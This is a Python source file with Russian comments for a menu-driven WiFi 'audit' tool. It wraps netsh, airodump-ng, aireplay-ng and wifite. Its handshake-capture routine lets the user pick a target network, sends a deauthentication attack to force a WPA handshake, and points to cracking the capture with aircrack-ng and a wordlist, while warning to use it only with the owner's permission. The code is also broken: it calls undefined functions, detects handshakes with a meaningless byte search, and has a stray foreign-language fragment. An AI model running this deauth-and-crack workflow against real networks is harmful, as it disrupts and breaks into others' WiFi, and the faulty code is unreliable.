"""
WiFi Module — Кроссплатформенный аудит WiFi
Работает на Windows (netsh) и Linux (airodump-ng / aircrack-ng)
"""

import subprocess
import sys
import os
import platform
import re
import shutil
import tempfile

# Добавляем корень проекта в путь при запуске напрямую
_project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)

from utils.helpers import (
    clear_screen, print_banner, print_success, print_error,
    print_info, print_warning, run_command, check_tool, safe_input
)
from utils.logger import setup_logger

logger = setup_logger()


def run_wifi_module():
    """Модуль WiFi-аудита"""
    while True:
        clear_screen()
        print_banner()
        print("\n  === WiFi: Аудит беспроводных сетей ===\n")
        print("  [1]  Сканирование WiFi-сетей")
        print("  [2]  Информация о текущем подключении")
        print("  [3]  Список сохранённых сетей")
        print("  [4]  Захват хендшейка (Linux)")
        print("  [5]  Запуск aircrack-ng (Linux)")
        print("  [6]  Запуск wifite (Linux)")
        print("  [0]  Назад\n")

        choice = input("  >>> Ваш выбор: ").strip()

        if choice == "1":
            scan_networks()
        elif choice == "2":
            show_connection_info()
        elif choice == "3":
            show_saved_networks()
        elif choice == "4":
            capture_handshake()
        elif choice == "5":
            run_aircrack_ng()
        elif choice == "6":
            run_wifite()
        elif choice == "0":
            break
        else:
            print_error("Неверный выбор.")
            input("  [Enter для продолжения...]")


def _is_windows():
    """Проверка, что работаем на Windows"""
    return platform.system() == "Windows"


def _is_linux():
    """Проверка, что работаем на Linux"""
    return platform.system() == "Linux"


# ========================
#  Windows helpers (netsh)
# ========================

def _run_netsh(args):
    """Выполнить netsh wlan <args> и вернуть stdout"""
    cmd = "netsh wlan " + " ".join(args)
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=30
        )
        stdout = result.stdout.decode("cp866", errors="replace")
        stderr = result.stderr.decode("cp866", errors="replace")
        return stdout, stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -1


def scan_networks_windows():
    """Сканирование WiFi-сетей через netsh (Windows)"""
    print_info("Сканирование WiFi-сетей (netsh)...\n")
    print_warning(" Нажмите Ctrl+C для остановки.\n")

    stdout, stderr, rc = _run_netsh(["show", "networks", "mode=Bssid"])
    if rc != 0:
        print_error(" Не удалось выполнить сканирование.")
        print_info(f" Ошибка: {stderr.strip()}")
        print_info(" Попробуйте запустить от имени администратора.")
        return

    if stdout is None or not stdout.strip():
        print_warning(" Сети не найдены или адаптер отключён.")
        return

    # Парсим вывод netsh
    networks = _parse_netsh_output(stdout)

    if not networks:
        print_warning(" Сети не найдены.")
        return

    print(f"\n  Найдено {len(networks)} сетей:\n")
    print(f"  {'#':<4} {'SSID':<30} {'BSSID':<20} {'Channel':<8} {'Signal':<8} {'Security':<15}")
    print(f"  {'─'*85}\n")

    for idx, net in enumerate(networks, 1):
        print(f"  {idx:<4} {net['ssid']:<30} {net['bssid']:<20} {net['channel']:<8} {net['signal']:<8} {net['security']:<15}")

    print(f"\n  Всего: {len(networks)} сетей")
    print_info("\n  Совет: для глубокого аудита используйте Linux + aircrack-ng")


def show_connection_info_windows():
    """Информация о текущем подключении (Windows)"""
    print_info("Информация о текущем подключении...\n")

    stdout, stderr, rc = _run_netsh(["show", "interfaces"])
    if rc != 0:
        print_error(f" Ошибка: {stderr.strip()}")
        return

    print(stdout)
    print_info("\n  Совет: для глубокого аудита используйте Linux + aircrack-ng")


def show_saved_networks_windows():
    """Список сохранённых WiFi-сетей (Windows)"""
    print_info("Сохранённые WiFi-сети...\n")

    stdout, stderr, rc = _run_netsh(["show", "profiles"])
    if rc != 0:
        print_error(f" Ошибка: {stderr.strip()}")
        return

    profiles = []
    for line in stdout.splitlines():
        if "Все пользовательские профили" in line:
            continue
        m = re.search(r":\s*(.+)$", line)
        if m:
            profiles.append(m.group(1).strip())

    if not profiles:
        print_warning(" Сохранённые сети не найдены.")
        return

    print(f"\n  Сохранено {len(profiles)} сетей:\n")
    for idx, prof in enumerate(profiles, 1):
        print(f"  {idx}. {prof}")

    print_info("\n  Совет: для глубокого аудита используйте Linux + aircrack-ng")


def _parse_netsh_output(output):
    """Парсит вывод netsh show networks"""
    networks = []
    current = {}
    for line in output.splitlines():
        line = line.strip()
        # Ищем SSID
        m = re.match(r"^\s*(.+?)\s{2,}", line)
        if m and "SSID" not in line and ":" not in line:
            current["ssid"] = line.strip()
        # Ищем BSSID
        m = re.match(r"BSSID\s+([0-9A-Fa-f:]+)", line)
        if m:
            current["bssid"] = m.group(1)
        # Ищем канал
        m = re.match(r"Channel\s+(\d+)", line)
        if m:
            current["channel"] = m.group(1)
        # Ищем сигнал
        m = re.match(r"Signal\s+(\d+)%", line)
        if m:
            current["signal"] = m.group(1) + "%"
        # Ищем тип безопасности
        m = re.match(r"Authentication\s+\((.+)\)", line)
        if m:
            current["security"] = m.group(1)
        # Новая сеть начинается с пустой строки или нового SSID
        if not line or (line and "SSID" in line and ":" not in line):
            if current.get("ssid"):
                networks.append(current)
            current = {}
    if current.get("ssid"):
        networks.append(current)
    return networks


# ========================
#  Linux helpers (aircrack-ng)
# ========================

def _check_linux_tool(name):
    """Проверка наличия утилиты в Linux или portable"""
    # Сначала portable
    portable_exe = get_portable_tool(name)
    if portable_exe:
        return True
    return shutil.which(name) is not None


def _run_linux(cmd):
    """Выполнить команду на Linux"""
    # Убираем sudo если он есть — работает и от root, и с sudo
    cmd = cmd.replace("sudo ", "", 1)
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=300
        )
        stdout = result.stdout.decode("utf-8", errors="replace")
        stderr = result.stderr.decode("utf-8", errors="replace")
        return stdout, stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -1


def _find_monitor_interfaces():
    """Ищет monitor-интерфейсы через iwconfig"""
    stdout, _, _ = _run_linux("iwconfig 2>/dev/null")
    if not stdout:
        return []

    monitors = []
    # Каждая строка интерфейса начинается с имени (без отступа) и содержит "IEEE"
    for line in stdout.splitlines():
        # Проверяем: строка не отступлена, содержит IEEE и Mode:Monitor
        if line and not line[0].isspace() and "IEEE" in line and "Mode:Monitor" in line:
            m = re.match(r'^(\S+)', line)
            if m:
                monitors.append(m.group(1))

    return monitors


def _find_wifi_interfaces():
    """Ищет обычные WiFi-интерфейсы через iwconfig (не в monitor mode)"""
    stdout, _, _ = _run_linux("iwconfig 2>/dev/null")
    ifaces = []
    if not stdout:
        return ifaces

    for line in stdout.splitlines():
        # Строка интерфейса: не отступлена, содержит IEEE, но НЕ Mode:Monitor
        if line and not line[0].isspace() and "IEEE" in line and "Mode:Monitor" not in line:
            m = re.match(r'^(\S+)', line)
            if m:
                ifaces.append(m.group(1))

    return ifaces


def _enable_monitor_mode(iface):
    """Включает monitor mode через airmon-ng и возвращает имя monitor-интерфейса"""
    # Сначала проверяем, не включён ли уже monitor mode
    stdout, _, _ = _run_linux(f"iwconfig {iface} 2>/dev/null")
    if stdout and "Mode:Monitor" in stdout:
        print_info(f"  Monitor mode уже включён на {iface}")
        return iface

    print_info(f"  Включаем monitor mode на {iface}...")
    _run_linux(f"airmon-ng start {iface}")

    # Ждём немного
    import time
    time.sleep(2)

    # Проверяем, какой интерфейс появился
    monitors = _find_monitor_interfaces()
    if monitors:
        return monitors[0]

    # Фоллбэк: пробуем {iface}mon
    candidate = f"{iface}mon"
    stdout, _, _ = _run_linux(f"iwconfig {candidate} 2>/dev/null")
    if stdout and "Mode:Monitor" in stdout:
        return candidate

    return None


def scan_networks_linux():
    """Сканирование WiFi-сетей через airodump-ng (Linux)"""
    print_info("Сканирование WiFi-сетей...\n")

    if not _check_linux_tool("airodump-ng"):
        print_error(" airodump-ng не установлен.")
        print_info(" Установите: sudo apt install -y aircrack-ng")
        return

    # Ищем monitor-интерфейс через iwconfig
    monitor_if = None
    monitors = _find_monitor_interfaces()
    if monitors:
        monitor_if = monitors[0]
        print_info(f"  Найден monitor-интерфейс: {monitor_if}")
    else:
        # Пробуем включить monitor mode на найденном WiFi-интерфейсе
        print_warning(" Monitor-интерфейс не найден. Пытаемся включить...")
        wifi_ifaces = _find_wifi_interfaces()
        if wifi_ifaces:
            monitor_if = _enable_monitor_mode(wifi_ifaces[0])
        else:
            # Фоллбэк на wlan0
            print_info("  Пробуем wlan0...")
            monitor_if = _enable_monitor_mode("wlan0")

    if not monitor_if:
        print_error(" Не удалось найти или включить monitor-интерфейс.")
        print_info(" Убедитесь, что WiFi-адаптер поддерживает monitor mode.")
        safe_input("  [Enter для продолжения...]")
        return

    print_info(f"  Monitor-интерфейс: {monitor_if}\n")
    print_warning("  Нажмите Ctrl+C для остановки.\n")

    try:
        result = subprocess.run(
            f"airodump-ng {monitor_if}",
            shell=True,
            check=False,
        )
    except KeyboardInterrupt:
        print_warning("\n  Сканирование остановлено.")
    except Exception as e:
        print_error(f"  Ошибка: {e}")

    print_info("\n  Совет: для автоматизации используйте wifite")


def _get_monitor_interface():
    """Возвращает monitor-интерфейс или включает его (через iwconfig)"""
    # Ищем monitor-интерфейсы через iwconfig
    monitors = _find_monitor_interfaces()
    if monitors:
        return monitors[0]

    # Пробуем включить monitor mode на найденном WiFi-интерфейсе
    print_warning(" Monitor-интерфейс не найден. Пытаемся включить...")
    wifi_ifaces = _find_wifi_interfaces()
    if wifi_ifaces:
        return _enable_monitor_mode(wifi_ifaces[0])
    else:
        print_info("  Пробуем wlan0...")
        return _enable_monitor_mode("wlan0")


def capture_handshake():
    """Автоматический захват WPA хендшейка для выбранной сети (Linux)"""
    if not _is_linux():
        print_warning(" Захват хендшейка доступен только на Linux.")
        print_info(" Для Windows используйте другие инструменты.\n")
        safe_input("  [Enter для продолжения...]")
        return

    if not _check_linux_tool("airodump-ng") or not _check_linux_tool("aireplay-ng"):
        print_error(" airodump-ng / aireplay-ng не установлены.")
        print_info(" Установите: sudo apt install -y aircrack-ng")
        safe_input("  [Enter для продолжения...]")
        return

    # Шаг 1: Получаем monitor-интерфейс
    print_info("Шаг 1: Ищем monitor-интерфейс...")
    monitor_if = _get_monitor_interface()
    if not monitor_if:
        print_error(" Не удалось включить monitor mode.")
        safe_input("  [Enter для продолжения...]")
        return
    print_success(f"  Monitor-интерфейс: {monitor_if}")

    # Шаг 2: Сканируем сети
    print_info("\nШаг 2: Сканируем сети...")
    print_warning("  Нажмите Ctrl+C для остановки.\n")

    stdout, _, _ = _run_linux(
        f"airodump-ng {monitor_if} --output-format csv -w /tmp/handshake_scan"
    )

    # Парсим CSV-файл с сетями
    csv_path = "/tmp/handshake_scan.csv"
    networks = []
    if os.path.exists(csv_path):
        with open(csv_path, "r") as f:
            lines = f.readlines()
            # Пропускаем заголовок, ищем строки с BSSID
            for line in lines[2:]:
                line = line.strip()
                if not line or line.startswith("BSSID") or line.startswith("station"):
                    continue
                parts = line.split(",")
                if len(parts) >= 6:
                    bssid = parts[0].strip()
                    ssid = parts[1].strip().strip('"')
                    channel = parts[2].strip()
                    security = parts[5].strip() if len(parts) > 5 else "?"
                    if bssid and bssid != "00:00:00:00:00:00":
                        networks.append({
                            "bssid": bssid,
                            "ssid": ssid,
                            "channel": channel,
                            "security": security,
                        })

    if not networks:
        print_error(" Сети не найдены.")
        safe_input("  [Enter для продолжения...]")
        return

    print(f"\n  Найдено {len(networks)} сетей:\n")
    print(f"  {'#':<4} {'SSID':<30} {'BSSID':<20} {'Ch':<6} {'Security'}")
    print(f"  {'─'*75}\n")
    for idx, net in enumerate(networks, 1):
        print(f"  {idx:<4} {net['ssid']:<30} {net['bssid']:<20} {net['channel']:<6} {net['security']}")

    # Шаг 3: Выбор цели
    print(f"\n  Введите номер цели (0 — отмена):")
    try:
        choice = input("  >>> ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if not choice or choice == "0":
        print_info(" Отменено.")
        return

    try:
        target_idx = int(choice) - 1
        if target_idx < 0 or target_idx >= len(networks):
            print_error(" Неверный номер.")
            safe_input("  [Enter для продолжения...]")
            return
    except ValueError:
        print_error(" Введите число.")
        safe_input("  [Enter для продолжения...]")
        return

    target = networks[target_idx]
    print(f"\n  Цель: {target['ssid']} ({target['bssid']}) Ch:{target['channel']}\n")

    # Шаг 4: Захват хендшейка
    print_info("Шаг 3: Начинаем захват хендшейка...")
    print_info("  Будет выполнена deauth-атака для принудительного рукопожатия.\n")
    print_warning("  ⚠  Используйте только на своих сетях или с разрешения владельца!\n")

    # Создаём директорию для захвата
    capture_dir = tempfile.mkdtemp(prefix="handshake_")
    pcap_base = os.path.join(capture_dir, "capture")

    # Запускаем airodump-ng в фоновом режиме
    airodump_cmd = (
        f"airodump-ng -c {target['channel']} "
        f"--bssid {target['bssid']} -w {pcap_base} "
        f"{monitor_if}"
    )

    airodump_proc = subprocess.Popen(
        airodump_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    # Даем airodump время на подключение
    print_info("  Ожидание 5 секунд...")
    import time
    time.sleep(5)

    # Запускаем deauth-атаку
    print_info("  Запускаем deauth-атаку...")
    deauth_cmd = (
        f"aireplay-ng -0 5 -a {target['bssid']} {monitor_if}"
    )
    deauth_proc = subprocess.Popen(
        deauth_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    # Ждём deauth
    deauth_proc.wait()
    print_success("  Deauth-атака отправлена.")

    # Ждём захват хендшейка (до 30 секунд)
    print_info("  Ожидание хендшейка (до 30 сек)...")
    handshake_found = False
    for i in range(30):
        # Ищем .cap файлы с хендшейком
        for cap_file in os.listdir(capture_dir):
            if cap_file.endswith("-01.cap"):
                cap_path = os.path.join(capture_dir, cap_file)
                result = subprocess.run(
                    f"airodump-ng -w {capture_dir}/check --write-interval 1 {monitor_if} 2>&1 | grep -i handshake",
                    shell=True, capture_output=True, timeout=3
                )
                _ = result.stdout.decode("utf-8", errors="replace")
                # Проверяем cap-файл через text search
                try:
                    with open(cap_path, "rb") as cf:
                        content = cf.read(10240)
                        if b"handshake" in content.lower() or b"HNTS" in content:
                            handshake_found = True
                            break
                except Exception:
                    pass
        if handshake_found:
            break
        time.sleep(1)

    # Останавливаем airodump
    airodump_proc.terminate()
    try:
        airodump_proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        airodump_proc.kill()

    # Ищем .cap файл
    cap_files = [f for f in os.listdir(capture_dir) if f.endswith("-01.cap")]
    if cap_files:
        cap_path = os.path.join(capture_dir, cap_files[0])
        file_size = os.path.getsize(cap_path)
        print_success(f"  .cap файл сохранён: {cap_path} ({file_size} байт)")

        if handshake_found:
            print_success("  ✓ Хендшейк успешно захвачен!")
            print_info(f"\n  Файл: {cap_path}")
            print_info("  Используйте для перебора: aircrack-ng -w wordlist.txt cap_file-01.cap")
        else:
            print_warning("  Хендшейк не найден в captured数据包.")
            print_info("  Попробуйте ещё раз или подождите больше времени.")
            print_info(f"  Файл: {cap_path}")
    else:
        print_warning("  .cap файл не найден.")

    # Очищаем
    safe_input("  [Enter для продолжения...]")


# ========================
#  Кроссплатформенные обёртки
# ========================
#  Кроссплатформенные обёртки
# ========================

def scan_networks():
    """Кроссплатформенное сканирование WiFi-сетей"""
    if _is_windows():
        scan_networks_windows()
    elif _is_linux():
        scan_networks_linux()
    else:
        print_error(" Неподдерживаемая платформа.")
        print_info(" Поддерживаются: Windows и Linux.")
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)


def show_connection_info():
    """Кроссплатформенная информация о подключении"""
    if _is_windows():
        show_connection_info_windows()
    elif _is_linux():
        print_info("Запрос информации о подключении...\n")
        stdout, _, rc = _run_linux("iwconfig 2>/dev/null || ip link show | grep -E 'wlan|wl'")
        if rc == 0 and stdout.strip():
            print(stdout)
        else:
            print_warning(" Не удалось получить информацию о подключении.")
            print_info(" Попробуйте: sudo iwconfig")
    else:
        print_error(" Неподдерживаемая платформа.")
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)


def show_saved_networks():
    """Кроссплатформенный список сохранённых сетей"""
    if _is_windows():
        show_saved_networks_windows()
    elif _is_linux():
        print_info("Сохранённые WiFi-сети (NetManager/NetworkManager)...\n")
        stdout, _, rc = _run_linux("nmcli device wifi list 2>/dev/null")
        if rc == 0 and stdout.strip():
            print("\n  Доступные сети:\n")
            print(stdout)
        else:
            print_warning(" Не удалось получить список сетей.")
            print_info(" Убедитесь, что NetworkManager запущен.")
    else:
        print_error(" Неподдерживаемая платформа.")
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)


# ========================
#  Wifite (Linux)
# ========================

def run_wifite():
    """Запуск wifite для автоматизированного аудита WiFi (Linux)"""
    if not _is_linux():
        print_warning(" Wifite доступен только на Linux.")
        print_info(" Для Windows используйте другие инструменты.\n")
        safe_input("  [Enter для продолжения...]")
        return

    # Portable-режим
    portable_wifite = get_portable_tool("wifite")
    wifite_cmd = portable_wifite if portable_wifite else "wifite"
    
    if wifite_cmd == "wifite" and not _check_linux_tool("wifite"):
        print_error(" wifite не установлен.")
        print_info(" Установите: sudo apt install -y wifite")
        safe_input("  [Enter для продолжения...]")
        return

    print_info("Запуск wifite (автоматизированный аудит WiFi)...\n")
    print_warning("  ⚠  Используйте только на своих сетях или с разрешения владельца!\n")

    try:
        subprocess.run([wifite_cmd, "--kill"], check=False)
    except KeyboardInterrupt:
        print_warning("\n  Wifite остановлен.")
    except Exception as e:
        print_error(f"  Ошибка: {e}")

    print_info("\n  Совет: для ручной работы используйте airodump-ng + aircrack-ng")
    safe_input("  [Enter для продолжения...]")


# ========================
#  Старая совместимость
# ========================

# Эти функции остаются для обратной совместимости, но вызывают новый код
run_wifite_compat = run_wifite
scan_networks_compat = scan_networks
